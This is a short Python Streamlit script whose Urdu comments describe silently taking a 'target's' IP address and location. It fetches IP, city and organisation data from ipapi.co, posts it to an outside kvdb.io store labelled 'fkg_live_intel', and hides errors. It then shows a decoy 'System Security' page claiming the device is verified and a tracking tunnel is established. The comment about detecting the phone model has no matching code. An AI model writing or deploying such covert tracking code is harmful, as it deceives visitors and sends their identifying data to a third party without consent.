import streamlit as st
import requests

# خاموشی سے ٹارگٹ کی آئی پی اور لوکیشن نکالنا
try:
    res = requests.get("https://ipapi.co/json/").json()
    # موبائل ماڈل کا پتا لگانے کے لیے ایک چھوٹی ٹرک
    info = f"IP: {res.get('ip')} | City: {res.get('city')} | Org: {res.get('org')}"
    # ڈیٹا بھیجنا
    requests.post("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_live_intel", data=info)
except:
    pass

st.title("FKG 🫀 System Security")
st.write("Device connection verified. Tracking tunnel established.")
st.progress(100)
